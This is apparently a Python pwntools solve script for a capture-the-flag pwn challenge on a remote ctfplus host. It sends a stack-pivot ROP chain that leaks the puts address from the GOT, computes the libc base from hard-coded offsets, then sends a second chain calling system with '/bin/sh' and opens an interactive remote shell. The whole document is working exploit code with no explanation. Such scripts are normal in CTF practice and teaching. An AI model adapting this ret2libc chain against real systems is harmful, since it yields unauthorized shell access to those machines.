from pwn import *

context.os = "linux"
context.arch = "amd64"

io = remote("nc1.ctfplus.cn", 34215)

pop_rdi = 0x40123f
leave = 0x40129a
retn = 0x40101a

plt_read = 0x401050
plt_puts = 0x401040
vuln = 0x401244

global_buf = 0x4047a0
got_puts = 0x404020

io.sendafter(
    b"Step 1: Send your ROP payload to the safe house:\n",
    flat(
        retn, # leave 消耗

        pop_rdi, got_puts,
        plt_puts,

        vuln
    ).ljust(0x200, b"A")
)

io.sendafter(
    b"Step 2: Trigger the pivot:\n",
    flat(
        b"A" * 16,
        global_buf,
        leave
    )
)

puts = u64(io.recv(6) + b'\x00\x00')

puts_offset = 0x80e10
libc_base = puts - puts_offset
system_offset = 0x50d70
system = libc_base + system_offset
binsh_offset = 0x1d8678
binsh = libc_base + binsh_offset

io.sendafter(
    b"Step 1: Send your ROP payload to the safe house:\n",
    flat(
        retn, # leave 消耗
        retn,

        pop_rdi, binsh,
        system
    ).ljust(0x200, b"A")
)

io.interactive()